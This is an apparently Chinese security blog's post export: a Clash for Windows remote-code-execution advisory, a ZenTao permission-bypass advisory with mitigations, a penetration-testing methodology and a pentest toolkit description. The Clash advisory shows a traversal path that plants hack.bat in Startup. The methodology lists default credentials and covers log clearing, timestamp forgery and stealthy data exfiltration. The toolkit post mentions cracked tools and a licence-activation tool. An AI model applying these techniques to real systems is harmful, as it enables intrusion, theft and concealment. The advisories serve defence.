[{"title":"clash最新远程代码执行漏洞","date":"2023-01-18T03:19:36.000Z","url":"/2023/01/18/clash%E6%9C%80%E6%96%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","categories":[["漏洞","/categories/%E6%BC%8F%E6%B4%9E/"]],"content":" 漏洞概述 clash for windows是一个使用 Go 语言编写，基于规则的跨平台代理软件核心程序。 Clash for Windows 是运行在 Windows 上的一图形化 Clash 分支。通过 Clash API 来配置和控制 Clash 核心程序，便于用户可视化操作和使用。 下载链接： 目前最新版本为V 0.20.12。 Windows 上的 clash_for_windows 在 0.20.12 在订阅一个恶意链接时存在远程命令执行漏洞。因为对订阅文件中 rule-providers 的 path 的不安全处理导致 cfw-setting.yaml 会被覆盖，cfw-setting.yaml 中 parsers 的 js代码将会被执行。 影响版本版本：&lt; V 0.20.12V 操作系统：Windows x64 系统版本：Windows 11 风险等级：高危 漏洞复现 PoC The attacker starts a web service to ensure that these two files can be accessed: 启动一个web服务来确保这两个文件可以被访问 config.yaml cfw-settings.yaml Victim uses subscription link 使用订阅链接 restart the clash_for_windows_pkg 重新启动 Update subscriptions or import new subscriptions 更新订阅或导入新订阅 日志文件 No response 其他补充由于是rule-providers的自定义path的问题，还有其他利用方式，比如用目录穿越写入开机启动项path: ../../../../../../Users/User/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/hack.bat不过杀毒软件会弹框 Since it is a problem with the custom path of rule-providers, there are other ways to use it, such as using directory traversal to write into the startup itempath: ../../../../../../Users/User/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/hack.batBut the antivirus software will warn."},{"title":"禅道系统权限绕过与命令执行漏洞（附POC）~","date":"2023-01-17T23:24:01.000Z","url":"/2023/01/18/%E7%A6%85%E9%81%93%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E4%B8%8E%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88%E9%99%84POC%EF%BC%89/","categories":[["漏洞","/categories/%E6%BC%8F%E6%B4%9E/"]],"content":"漏洞描述禅道是一款国产的开源项目管理软件。它集产品管理、项目管理、质量管理、文档管理、组织管理和事务管理于一体，是一款专业的研发项目管理软件，完整覆盖了研发项目管理的核心流程，也是国内最流行的项目管理软件。 官方链接： 该系统在2023年初被爆出在野命令执行漏洞，官方已于2023年1月12日发布了漏洞修复补丁。该漏洞是由于禅道项目管理系统权限认证存在缺陷导致，攻击者可利用该漏洞在未授权的情况下，通过权限绕过在服务器执行任意命令。 影响范围 禅道系统 影响版本 开源版 17.4以下的未知版本&lt;=version&lt;=18.0.beta1 旗舰版 3.4以下的未知版本&lt;=version&lt;=4.0.beta1 企业版 7.4以下的未知版本&lt;=version&lt;=8.0.beta1 8.0.beta 漏洞说明漏洞类型：命令执行、权限绕过 漏洞危害：攻击者利用此漏洞可实现任意执行命令 漏洞编号：CVE暂无，其他编号QVD-2023-1953 ***CVSS 3.1***评级：****9.8分 风险等级：高危 漏洞复现奇安信CERT： 烽火台实验室： 漏洞检测 以开源版禅道为例： 可以在不登录的情况下查看网页源代码： 若已登录，也可以在右下角查看禅道版本： 若版本在影响范围内，则系统有可能受该漏洞影响。 攻击排查 1、以Windows举例，用户可通过排查系统中日志是否存在以下内容，若存在，则说明系统可能遭受到攻击： 2、攻击者可能会使用一个空白用户名来创建一个代码库名为12346的操作，如下图所示，若存在该操作，则系统可能遭到攻击。 加固措施 1、进行官方升级: 具体升级方法 2、安全产品升级: 部分厂商安全产品具备识别该漏洞功能，进行版本升级至最新版。 3、临时防护措施： 可在module/common/model.php文件中 echo $endResponseException-&gt;getContent();后面加上exit(); 来修复权限绕过漏洞。"},{"title":"个人渗透测试常用方法总结","date":"2023-01-13T09:22:34.000Z","url":"/2023/01/13/%E4%B8%AA%E4%BA%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/","categories":[["渗透","/categories/%E6%B8%97%E9%80%8F/"]],"content":"一、渗透流程 信息收集 漏洞验证/漏洞攻击 提权，权限维持 日志清理 信息收集一般先运行端口扫描和漏洞扫描获取可以利用的漏洞。多利用搜索引擎 端口扫描有授权的情况下直接使用 nmap 、masscan 、自己写py脚本等端口扫描工具直接获取开放的端口和获取服务端的 banner 信息。使用 Python 端口扫描的介绍 下基于 Powershell 的端口扫描脚本。  漏洞扫描使用Nessus、awvs等漏扫工具直接扫描目标，可以直接看到存活主机和主机的漏洞情况。 二、漏洞攻击如果只是使用端口扫描，只是发现开放的端口，在获取 banner 信息后需要在漏洞库（seebug，ExploitDB ）上查找对应 CVE，后面就是验证漏洞是否存在。安全检查一般是尽可能的发现所有漏洞，对漏洞的风险进行评估和修复。入侵的话只关注高危远程代码执行和敏感信息泄露漏洞等可以直接利用的漏洞。漏洞验证可以找对应的 CVE 编号的 POC、EXP，利用代码在 ExploitDB 、seebug上查看或者在 github 上搜索是否有相关的漏洞验证或利用的工具。 2.1 Web应用可以直接寻找注入、上传、代码执行、文件包含、跨站脚本、等漏洞，来进行攻击。一般可以使用 AWVS 直接扫描常见漏洞。 2.1.2 Web 中间件（1）TomcatTomcat是Apache Jakarta软件组织的一个子项目，Tomcat是一个JSP/Servlet容器，它是在SUN公司的JSWDK（Java Server Web Development Kit）基础上发展起来的一个JSP和Servlet规范的标准实现，使用Tomcat可以体验JSP和Servlet的最新规范。 端口号：8080 攻击方法： 默认口令、弱口令，爆破，tomcat5 默认有两个角色：tomcat和role1。其中账号both、tomcat、role1的默认密码都是tomcat。弱口令一般存在5以下的版本中。 在管理后台部署 war 后门文件 远程代码执行漏洞 参考：     （2） Jboss是一个运行EJB的J2EE应用服务器。它是开放源代码的项目，遵循最新的J2EE规范。从JBoss项目开始至今，它已经从一个EJB容器发展成为一个基于的 J2EE 的一个Web 操作系统（operating system for web），它体现了 J2EE 规范中最新的技术。 端口：8080 攻击方法： 弱口令，爆破 管理后台部署 war 后门 反序列化 远程代码执行 参考：     （3）WebLogicWebLogic是美国Oracle公司出品的一个Application Server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。 端口：7001，7002 攻击方法： 弱口令、爆破，弱密码一般为weblogic/Oracle@123 or weblogic 管理后台部署 war 后门 SSRF 反序列化漏洞 weblogic_uac 参考：     （4） WebSphereIBM公司一套典型的电子商务应用开发工具及运行环境。 端口：默认端口：908*；第一个应用就是9080，第二个就是9081；控制台9090 攻击方法： 控制台登录爆破 很多内网 websphere 的控制台存在弱口令 / 默认口令，可以使用 admin/admin 以及 webshpere/webshpere 这种口令登录。通过该口令登录控制台后，可以部署 war 包，从而获取到 WEBSHELL 。 反序列化 任意文件泄露 参考：    （5） Glassfish2.1.3 Web 框架（1） Struts2Struts2是一个优雅的,可扩展的框架,用于创建企业准备的Java Web应用程序。出现的漏洞也着实的多每爆一个各大漏洞平台上就会被刷屏。 可利用漏洞 S2-046 CVE-2017-5638 Struts 2.3.5-2.3.31,Struts 2.5-2.5.10 S2-045 CVE-2017-5638 Struts 2.3.5-2.3.31,Struts 2.5-2.5.10 S2-037 CVE-2016-4438 Struts 2.3.20-2.3.28.1 S2-032 CVE-2016-3081 Struts 2.3.18-2.3.28 S2-020 CVE-2014-0094 Struts 2.0.0-2.3.16 S2-019 CVE-2013-4316 Struts 2.0.0-2.3.15.1 S2-016 CVE-2013-2251 Struts 2.0.0-2.3.15 S2-013 CVE-2013-1966 Struts 2.0.0-2.3.14 S2-009 CVE-2011-3923 Struts 2.0.0-2.3.1.1 S2-005 CVE-2010-1870 Struts 2.0.0-2.1.8.1 参考：    （2）Spring 框架Spring Framework 是一个开源的Java／Java EE全功能栈（full-stack）的应用程序框架，以Apache License 2.0开源许可协议的形式发布，也有.NET平台上的移植版本。Spring Framework提供了一个简易的开发方式，这种开发方式，将避免那些可能致使底层代码变得繁杂混乱的大量的属性文件和帮助类。 可利用漏洞 CVE-2010-1622 CVE-2018-1274 CVE-2018-1270 CVE-2018-1273 反序列化 目录穿越 参考      2.1.4 Web 服务器 IIS：Windows 的 WWW 服务器 端口：80 攻击方法： IIS，开启了 WebDAV，可以直接详服务器 PUT 文件 短文件名枚举漏洞 远程代码执行 提权漏洞 解析漏洞 参考：    Apache 端口：80 攻击方法： 解析漏洞 目录遍历 Nginx 端口：80 攻击方法： 解析漏洞 目录遍历 CVE-2016-1247：需要获取主机操作权限，攻击者可通过软链接任意文件来替换日志文件，从而实现提权以获取服务器的root权限。 参考：  lighttpd 端口：80 攻击方法： 目录遍历 2.2 常见运维系统一般分自动化部署和运维监控相关的的工具。漏洞可以通过搜索引擎搜索，github搜索，ExploitDB搜索，官网上的安全通告获取。内网的通用类应用比较常见的问题是弱口令，如果一个管理员可以登录几个系统，那在这几个系统的账号、密码也基本上是一样的。 2.2.1 GitlabGitLab是一个利用 Ruby on Rails 开发的开源应用程序，实现一个自托管的项目仓库，可通过Web界面进行访问公开的或者私人项目。 可利用漏洞： 任意文件读取漏洞 意用户 token 泄露漏洞 命令执行漏洞 参考：   2.2.2 JenkinsJenkins是一种跨平台的持续集成和交付的应用软件，它便于不断稳定地交付新的软件版本，并提高你的工作效率。这款开发运维工具还让开发人员更容易把项目的变化整合起来，并使用大量的测试和部署技术。 可利用漏洞： 远程代码执行漏洞 反序列化漏洞 未授权访问漏洞 登录入口爆破 参考    2.2.3 PuppetPuppet Enterprise专门管理基础设施即代码(IAC)，在这种类型的IT基础设施配置过程中，系统用代码而不是脚本流程来自动构建、管理和配置。由于它是代码，整个过程易于重复。Puppet有助于更容易控制版本、自动化测试和持续交付，可以更快速地响应问题或错误。 可利用漏洞，很少公开的POC 反序列化 远程命令执行 2.2.4 AnsibleAnsible是一种配置和管理工具，面向客户端的软件部署和配置，支持Unix、Linux和Windows。它使 用JSON和YAML，而不是IAC，根本不需要节点代理就可以安装。它可以通过OpenStack在内部系统上使用，也可以在亚马逊EC2上使用。 可利用漏洞 远程代码执行 2.2.5 NagiosNagios是一款开源的电脑系统和网络监视工具，能有效监控Windows、Linux和Unix的主机状态，交换机路由器等网络设置，打印机等。在系统或服务状态异常时发出邮件或短信报警第一时间通知网站运维人员，在状态恢复后发出正常的邮件或短信通知。 可利用漏洞 代码执行 SQLi 参考   2.2.6 ZabbixZabbix 是一款强大的开源分布式监控系统, 能够将SNMP、JMX、Zabbix Agent提供的数据通过WEB GUI的方式进行展示. 可利用漏洞（具体参考 ExploitDB）： 远程代码执行 SQLi shell 命令注入 认证绕过 默认账户与密码，默认口令 admin/zabbix，或者是guest/空 参考    2.2.7 CacitCacti是一套基于PHP,MySQL,SNMP及RRDTool开发的网络流量监测图形分析工具。 可利用漏洞 任意代码执行 SQLi 登录爆破 默认密码admin/admin 参考：  2.2.8 SplunkSplunk Enterprise 可以从任何来源监控和分析机器数据，以提供操作智能，从而优化您的 IT、安全和业务绩效。Splunk Enterprise 具有直观的分析功能、机器学习、打包应用程序和开放式 API，是一个灵活的平台，可从重点用例扩展到企业范围的分析主干。 可利用漏洞 信息泄露 命令注入 服务端请求伪造 参考 ExploitDB 搜索 2.3 常见 Web 应用还有常见邮件应用、CMS 应用，在搜索引擎上查找对应的漏洞，利用已知漏洞进行攻击。 2.3.1 邮件系统一部分是使用腾讯企业邮箱、阿里企业邮箱的，很难有可利用的漏洞，另外一种是能独立部署的邮件系统，政企常用的邮箱应用： Coremail 亿邮 35互联 TurboMail Exchange IBM Lotus 2.3.2 CMS 应用2.4 数据库/缓存/消息服务2.4.1 MySQL数据库 默认端口：3306 攻击方法： 爆破：弱口令 身份认证漏洞：CVE-2012-2122 拒绝服务攻击 Phpmyadmin万能密码绕过：用户名：‘localhost’@’@” 密码任意 提权 参考：    2.4.2 MSSQL数据库 默认端口：1433（Server 数据库服务）、1434（Monitor 数据库监控） 攻击方法： 爆破：弱口令/使用系统用户 注入 参考：  2.4.3 Oracle数据库 默认端口：1521（数据库端口）、1158（Oracle EMCTL端口）、8080（Oracle XDB数据库）、210（Oracle XDB FTP服务） 攻击方法： 爆破：弱口令 注入攻击； 漏洞攻击；-参考：  2.4.4 PostgreSQL数据库PostgreSQL是一种特性非常齐全的自由软件的对象–关系型数据库管理系统，可以说是目前世界上最先进，功能最强大的自由数据库管理系统。包括kali系统中msf也使用这个数据库；浅谈postgresql数据库攻击技术 大部分关于它的攻击依旧是sql注入，所以注入才是数据库不变的话题。 默认端口：5432 攻击方法： 爆破：弱口令：postgres postgres 缓冲区溢出：CVE-2014-2669 参考：   2.4.5 MongoDB数据库MongoDB，NoSQL数据库；攻击方法与其他数据库类似》 默认端口：27017 攻击方法： 爆破：弱口令 未授权访问；github有攻击代码；请点击 参考：   2.4.6 Redis数据库Redis是一个开源的使用c语言写的，支持网络、可基于内存亦可持久化的日志型、key-value数据库。关于这个数据库这两年还是很火的，暴露出来的问题也很多。特别是前段时间暴露的未授权访问。 攻击方法： 爆破：弱口令 未授权访问+配合ssh key提权； 参考：  2.4.7 SysBase数据库 默认端口：服务端口5000；监听端口4100；备份端口：4200 攻击方法： 爆破：弱口令 命令注入： 参考 2.4.8 DB2 数据库 默认端口：5000 攻击方法： 安全限制绕过：成功后可执行未授权操作（CVE-2015-1922） 参考：  2.5 常见服务/协议2.5.1 FTP 服务FTP服务：ftp服务我分为两种情况，第一种是使用系统软件来配置，比如IIS中的FTP文件共享或Linux中的默认服务软件；第二种是通过第三方软件来配置，比如Serv-U还有一些网上写的简易ftp服务器等；默认端口：20（数据端口）；21（控制端口）；69（tftp小型文件传输协议） 攻击方式： 爆破：ftp的爆破工具有很多，这里我推荐owasp的Bruter 以及msf中ftp爆破模块； 匿名访问：用户名：anonymous 密码：为空或任意邮箱 嗅探：ftp使用明文传输技术（但是嗅探给予局域网并需要欺骗或监听网关） 后门 vsftp 远程溢出 跳转攻击 2.5.2 NFS 服务NFS（Network File System）即网络文件系统，是FreeBSD支持的文件系统中的一种，它允许网络中的计算机之间通过TCP/IP网络共享资源。在NFS的应用中，本地NFS的客户端应用可以透明地读写位于远端NFS服务器上的文件，就像访问本地文件一样。如今NFS具备了防止被利用导出文件夹的功能，但遗留系统中的NFS服务配置不当，则仍可能遭到恶意攻击者的利用。 攻击方法 未授权访问 参考   2.5.3 Samba服务Samba是linux和unix系统上实现SMB/CIFS协议的一个免费软件，由服务器和客户端程序构成。而SMB是局域网支持共享文件和打印机的一种通信协议，为局域网内不同计算机之间提供文件及打印机等资源的共享服务。 攻击方法 远程代码执行 弱口令 未授权访问（public） 参考  2.5.4 SSH 服务SSH 是协议，通常使用 OpenSSH 软件实现协议应用。SSH 为 Secure Shell 的缩写，由 IETF 的网络工作小组（Network Working Group）所制定；SSH 为建立在应用层和传输层基础上的安全协议。SSH 是目前较可靠，专为远程登录会话和其它网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。 端口：22 攻击方法： 爆破 后门 漏洞：28退格漏洞、OpenSSL漏洞 参考  2.5.5 Telnet 服务Telnet协议是TCP/IP协议族中的一员，是Internet远程登陆服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程主机工作的能力。在終端使用者的电脑上使用telnet程序，用它连接到服务器。終端使用者可以在telnet程序中输入命令，这些命令会在服务器上运行，就像直接在服务器的控制台上输入一样。可以在本地就能控制服务器。 默认端口：21 攻击方法： 爆破 嗅探 2.5.6 Windows 远程连接 默认端口：3389 攻击方法 爆破 Shift粘滞键后门：5次shift后门 利用ms12-020攻击3389端口 2.5.7 VNC服务VNC（Virtual Network Computing），为一种使用RFB协议的显示屏画面分享及远程操作软件。此软件借由网络，可发送键盘与鼠标的动作及即时的显示屏画面。 默认端口：5900+桌面ID（5901；5902） 攻击方式： 爆破：弱口令 认证口令绕过： 拒绝服务攻击：（CVE-2015-5239） 权限提升：（CVE-2013-6886） 2.5.8 SMTP协议smtp：邮件协议，在linux中默认开启这个服务，可以向对方发送钓鱼邮件！ 默认端口：25（smtp）、465（smtps） 攻击方式： 爆破：弱口令 未授权访问 2.5.9 POP3协议 默认端口：109（POP2）、110（POP3）、995（POP3S） 攻击方式： 爆破；弱口令 未授权访问； 2.5.10 DNS服务 默认端口：53 攻击方式： 区域传输漏洞 2.5.11 IMAP协议 默认端口：143（imap）、993（imaps） 攻击方式： 爆破：弱口令 配置不当 2.5.12 SNMP协议 默认端口：161 攻击方式: 爆破：弱口令 2.5.13 DHCP服务 默认端口：67&amp;68、546（DHCP Failover做双机热备的） 攻击方式： DHCP劫持； 2.6 云环境2.6.1 VMware使用 VMware vCloud 可将现有数据中心内的虚拟基础架构资源池化，并将其作为基于目录的服务交付。通过与云计算基础架构的最佳平台 VMware vSphere 配合使用，VMware vCloud Director 可为客户提供构建安全的私有云，从而改变 IT 部门交付和管理基础架构服务以及用户访问和使用这些服务的方式。一般组织中很多独立安装的 Esxi 形式的私有云，或独立部署的虚拟化系统。 端口（很多）：   漏洞 主机逃逸 CVE-2017-5638 参考：        2.6.2 OpenStackOpenStack是基础设施即服务（IaaS）软件，让任何人都可以自行创建和提供云计算服务。此外，OpenStack也用作创建防火墙内的“私有云”（Private Cloud），提供机构或企业内各部门共享资源。 漏洞，有漏洞但是POC基本没有。检查时候可以参考安全的配置实践。 权限绕过漏洞 信息泄露 代码执行漏洞 参考：    2.6.3 DockerDocker是一个开放源代码软件项目，让应用程序布署在软件容器下的工作可以自动化进行，借此在Linux操作系统上，提供一个额外的软件抽象层，以及操作系统层虚拟化的自动管理机制[1]。Docker利用Linux核心中的资源分脱机制，例如cgroups，以及Linux核心名字空间（name space），来创建独立的软件容器（containers）。这可以在单一Linux实体下运作，避免引导一个虚拟机造成的额外负担。Linux核心对名字空间的支持完全隔离了工作环境中应用程序的视野，包括进程树、网络、用户ID与挂载文件系统，而核心的cgroup提供资源隔离，包括CPU、内存、block I/O与网络。从0.9版本起，Dockers在使用抽象虚拟是经由libvirt的LXC与systemd – nspawn提供界面的基础上，开始包括libcontainer函数库做为以自己的方式开始直接使用由Linux核心提供的虚拟化的设施。 安全问题（很少有漏洞的POC，安全检查也是基于最佳实践和官方安全建议进行）： CVE-2015-3630 1.6.0 Docker Libcontainer 安全绕过漏洞 CVE-2015-3627 1.6.1 Libcontainer和Docker Engine 权限许可和访问控制漏洞 CVE-2015-3630 1.6.1 Docker Engine 安全绕过漏洞 CVE-2014-9358 1.3.3 Docker 目录遍历漏洞 CVE-2014-9357 1.3.2 Docker 权限许可和访问控制漏洞 CVE-2014-6408 1.3.1 Docker 权限许可和访问控制漏洞 CVE-2014-5277 1.3.0 Docker和docker-py 代码注入漏洞 内核漏洞（Kernel exploits） 容器是基于内核的虚拟化，主机（host）和主机上的所有容器共享一套内核。如果某个容器的操作造成了内核崩溃，那么反过来整台机器上的容器都会受到影响。 拒绝服务攻击（Denial-of-service attacks） 所有的容器都共享了内核资源，如果一个容器独占了某一个资源（内存、CPU、各种ID），可能会造成其他容器因为资源匮乏无法工作（形成DoS攻击）。 容器突破（Container breakouts） Linux的namespace机制是容器的核心之一，它允许容器内部拥有一个PID=1的进程而在容器外部这个进程号又是不一样的（比如1234）。现在问题在于如果一个PID=1的进程突破了namespace的限制，那么他将会在主机上获得root权限。 有毒镜像（Poisoned images） 主要是考虑到镜像本身的安全性，没太多好说的。 参考：         2.7 大数据2.7.1 ElsaticsearchElasticsearch 是一个分布式的搜索和分析引擎，可以用于全文检索、结构化检索和分析，并能将这三者结合起来。Elasticsearch 基于 Lucene 开发，现在是使用最广的开源搜索引擎之一，Wikipedia、Stack Overflow、GitHub 等都基于 Elasticsearch 来构建他们的搜索引擎。 默认端口：9200（）、9300（） 攻击方法： 未授权访问； 远程命令执行； 文件遍历； 低版本webshell植入； 参考   2.7.2 hadoopHadoop是一个开源的框架，可编写和运行分布式应用处理大规模数据，是专为离线和大规模数据分析而设计的，并不适合那种对几个记录随机读写的在线事务处理模式。Hadoop=HDFS（文件系统，数据存储技术相关）+ Mapreduce（数据处理），Hadoop的数据来源可以是任何形式，在处理半结构化和非结构化数据上与关系型数据库相比有更好的性能，具有更灵活的处理能力，不管任何数据形式最终会转化为key/value，key/value是基本数据单元。用函数式变成Mapreduce代替SQL，SQL是查询语句，而Mapreduce则是使用脚本和代码，而对于适用于关系型数据库，习惯SQL的Hadoop有开源工具hive代替。Hadoop就是一个分布式计算的解决方案。 参考：     2.7.3 HiveHive是Hadoop家族中一款数据仓库产品，Hive最大的特点就是提供了类SQL的语法，封装了底层的MapReduce过程，让有SQL基础的业务人员，也可以直接利用Hadoop进行大数据的操作。 参考：   2.7.4 SqoopApache Sqoop（SQL-to-Hadoop） 项目旨在协助 RDBMS 与 Hadoop 之间进行高效的大数据交流。用户可以在 Sqoop 的帮助下，轻松地把关系型数据库的数据导入到 Hadoop 与其相关的系统 (如HBase和Hive)中；同时也可以把数据从 Hadoop 系统里抽取并导出到关系型数据库里。除了这些主要的功能外，Sqoop 也提供了一些诸如查看数据库表等实用的小工具。 参考  2.7.5 HBaseHBase建立在HDFS之上，提供高可靠性、高性能、列存储、可伸缩、实时读写的数据库系统。它介于NoSQL和RDBMS之间，仅能通过行键(row key)和行键序列来检索数据，仅支持单行事务(可通过Hive支持来实现多表联合等复杂操作)。主要用来存储非结构化和半结构化的松散数据。与Hadoop一样，HBase目标主要依靠横向扩展，通过不断增加廉价的商用服务器，来增加计算和存储能力。 参考：   2.7.6 SparkSpark是UC Berkeley AMP lab所开源的类Hadoop MapReduce的通用的并行计算框架，Spark基于map reduce算法实现的分布式计算，拥有Hadoop MapReduce所具有的优点；但不同于MapReduce的是Job中间输出和结果可以保存在内存中，从而不再需要读写HDFS。参考：  三、提权权限维持3.1 提权SecWiki 总结了：   3.2建立后门/端口转发参考：    端口转发及代理类工具 LCX：windows下面的端口转发软件。 sockscap：主要针对windows平台的端口转发和代理转发。 proxifier：跨平台的端口转发和代理工具，适用windows，linux， Macos平台，代理转发利器 Rsscoks：＊nix平台下的端口转发和代理工具，配合proxychains好用 到不行。 Proxychains：＊nix平台下老牌的socks代理工具，一般的系统都会自 带，谁用谁知道。 ssh proxy：通过ssh做端口代理和转发，一般＊nix系统都自带。 netcat：socat，hping，在很多情况下可以做端口转发和数据代理转 发。 metasploit：metasploit的后渗透模块中有不少代理模块和端口转发 模块。 在中转服务器上下载端口转发工具（加密压缩）： 能连接互联网下载 通过 mstsc 的磁盘加载 通过入口服务器中转 通过远程控制软件上传 3.3 传输文件3.3.1 文件打包关于打包 Rar文件打包，压缩d:\\data\\目录下所有2013-01-01后修改的doc文件，100M/包密码为Pass，-x为排除选项 7z加密，压缩d:\\data下所有文件，密码为Pass，分卷100M/包 Linux用 tar 打包文件是可以加密码，要跟openssl结合使用。 使用 tar 对加密文件解压： ### 3.4.2 文件传输 几个思路 使用端口转发直接传送数据； 搭建 FTP、HTTP 协议； 上传到云端再下载； 3.4 制作后门/木马程序一般用Matisploit 的 msfvenom，使用参考：   SET 也可以生成后门程序，另外也可以关注一下最新的 Office、PDF 的漏洞 四、日志清理在做日志清理前需要了解以下的内容： 攻击和入侵很难完全删除痕迹，没有日志记录本身就是一种入侵特征； 删除或清理入侵系统的本地日志不代表删除了痕迹，在网络设备、安全设备、集中化日志系统上仍然留存记录； 留存的后门本身会有攻击者的信息； 使用的代理或跳板可能会被反向入侵; 在操作前检查是否有管理员登录； 删除上传的工具，使用磁盘覆写的功能删除； Windows日志类型 web日志：IIS、Apache以及其它web日志 操作日志：3389登录列表、最近访问文件、IE等浏览 器访问日志、文件访问日志 登陆日志：系统应用日志-安全日志等 攻击前和状态还原，尽量保持一致 Linux操作日志 Linux历史操作 SSHD登陆记录 删除~/.ssh/known_hosts中记录 修改文件时间戳 touch –r 原文件要修改文件 删除临时使用文件，尤其是tmp目录 logtamper 5 工具和其他 内网使用工具渗透的一些原则 使用适合自己的工具，工具没必要收集太多，够用就行； 能根据实际情况编写适用的工具； 不能确保安全的工具均要在虚拟机中运行（很 多捆绑病毒木马）； 做安全检查的话，尽量使用 GitHub 上开源的工具。 工具介绍 个人习惯使用 kali 自带工具，特定 POC 先从 Github 上搜索。推荐一个工具介绍的网站： 渗透注意事项 检查内网监控防范系统 谨慎使用ARP软件和大面积扫描软件 使用目标网络中无空闲机器，作为打包对象 使用内网大流量机器作为传输对象，如wsus服务 器、视频会议系统 使用临时机器打包、数据传输，不要使用已控机器，可利用wmi脚本或wmic远程操作 渗透注意事项 禁止使用psexec.exe 打包时避开用户工作时间 控制卷包大小&lt;100M 选择用户常用压缩软件 错峰下载数据 控制传输流量 清除所有操作日志 登录主机前先看看管理员是否在 "},{"title":"~Windows10 Penetration Suite Toolkit within Kali Linux v4.0~","date":"2022-12-09T07:48:43.000Z","url":"/2022/12/09/Windows10-Penetration-Suite-Toolkit-within-Kali-Linux-v4-0/","categories":[["渗透","/categories/%E6%B8%97%E9%80%8F/"]],"content":"2022.12.06 更新说明: 由于Kali的图形化模式占用资源造成卡顿，且使用率不高，特此去除图形化模式。 参考链接 VMware Workstation 不可恢复错误（vcpu-0）解决方法: 升级VMware至17.0最新版 虚拟机设置-处理器-虚拟化引擎，关闭“虚拟化Intel VT-x/EPT 或 AMD-V/RVI(V)” 虚拟机设置-显示器-3D图形，关闭“加速3D图形” 开启物理机bios设置的CPU虚拟化 参考链接 补充了大量实用工具，升级部分软件为最新版； 重构了“漏洞工具” 的目录分类，查找更方便快捷； 重构了开始菜单及快捷启动索引； 特别鸣谢: @棉花糖网络安全圈 @利刃信安 @果核剥壳 @雨苁 @狐狸说安全 @暗魂攻防实验室 今后的更新方式: 添加或升级软件等小幅更新会同步在网盘发布软件安装包； 重大升级更新或迭代会重新制作虚拟机镜像。 系统简介: 基于Win10 Workstation 21H2 x64 原版镜像制作（不适用于ARM设备）； 完整安装WSL Kali Linux 2022.3； 精简系统自带软件，美化字体及部分图标，适度优化； 使用单磁盘文件存储，提升性能； 推荐运行环境: vmware:16.x（vmware图形内存1G） 运行内存:8G 固态硬盘:200G 制作声明: 所有的安装类软件均下载自软件对应的官方网站； 所有的绿色类软件均下载自果核剥壳 ； 所有的脚本类工具均下载自github； 部分授权类工具（破解版）及优秀的渗透工具来自微信公号分享； 排名不分先后，同时也推荐大家关注，一起变得更强。 雾晓安全、果核剥壳、归零安全、潇湘信安、学蚁致用、谢公子学安全、利刃信安、棉花糖网络安全圈、狐狸说安全、HACK技术沉淀营、无尾熊安全、T00ls、渗透攻击红队、洛米唯熊、雷石安全实验室、酒仙桥六号部队、InBug实验室、鸿鹄实验室、黑白之道、HACK之道、GobySec、Gcow安全团队、Gamma实验室、CobaltStrike实战、网络安全与黑客技术、QZ的安全悟道、菜鸟学信安、乌雲安全、白帽子飙车路、信安之路、chaosec、鸟哥谈安全、安全小飞侠、moonsec、系统安全运维、天驿安全、零组攻防实验室、Lemonsec、橘猫学安全、Hacking黑白红、渗透安全团队、渗透xiao白帽、白帽子社区、HACK学习呀、猪猪谈安全、开普勒安全团队、吾爱破解论坛、WhITECat安全团队、寻云安全团队、Khan安全攻防实验室、Bypass、天億网络安全、关注安全技术、玄魂工作室、边界骇客、零度安全攻防实验室、WgpSec狼组安全团队、黑白天实验室、靶机狂魔、渗透云笔记、TeamsSix、hijackY、重生信息安全、TimeLine Sec、GobySec、Gcow安全团队、冰蚕实验室。 本集成环境是根据本人渗透工作和学习中的侧重点进行制作，不可能做到满足所有人的需求； 本项目制作的初衷是帮助渗透新手快速搭建工作环境，工欲善其事，必先利其器； 本项目由于后期调试原因可能会遗留部分本人的信息，请直接忽视； 本项目坚决不接受也从未曾接受任何形式的赞助； 如果您有好的意见或者建议，请联系邮箱 burpsuite@qq.com。 免责声明: 本镜像仅面向合法授权的企业安全建设行为，如您需要测试本镜像的可用性，请自行搭建靶机环境； 在使用本镜像进行检测时，您应确保该行为符合当地的法律法规，并且已经取得了足够的授权； 如您在使用本镜像的过程中存在任何非法行为，您需自行承担相应后果，作者将不承担任何法律及连带责任； 本镜像所使用的工具资源均来自于网友投稿及互联网整理，作者仅提供分享交流平台，不为其版权负责。如果您发现本镜像中有侵犯您（或贵司）知识产权的资源，请及时反馈，作者会第一时间进行修改或删除。 软件及工具介绍:系统环境类: Directx Net Framework 3.5 Net Framework 4.8 Microsoft C runtime library Microsoft visual C++ 2005-2022 集成常用字库 WindowsApp类: WSL Kali Linux Windows Terminal（已替换默认cmd） 其他工具类 （C:\\Softwares）: AAct:激活工具（激活windows &amp; office） Bandicam:视频录制工具（注册版） Bandizip:压缩工具（注册版） Chrome:108.0.5359 绿色修改版 主要集成插件: Adblock:广告拦截工具 Charset:修改网页编码工具 Chrome清理大师:chrome清理工具 Editthiscookie:cookie编辑工具 FindSomething:敏感文件搜集工具 Fofa view:fofa工具 Funnel search:google搜索工具 Hackbar Hack-Tools:红队综合小工具 Heimdallr:指纹识别、蜜罐特征告警工具 IE Tab:ie兼容模式工具 Infinity:标签页工具 IP address and domain inf:ip&amp;domain探测工具 IP whois:whois 探测工具 Neater bookmarks:书签管理工具 Octotree:github资源树查看工具 Onetab:标签管理工具 Penetration Testing Kit:红队综合小工具 Postwoman:接口调试工具 Proxy switchyomega:代理切换工具 Seoquake:网页统计工具 Supercopy:超级复制 Tampermonkey:脚本工具 User-Agent Switcher:浏览头切换工具 Toolbox 常用工具:集成常用小工具 Vulners Web Scanner:微型漏洞扫描工具 Wappalyzer:网页技术分析工具 WebSocket Test Client:websocket工具 Whatruns:网页技术分析工具 XSS辅助工具 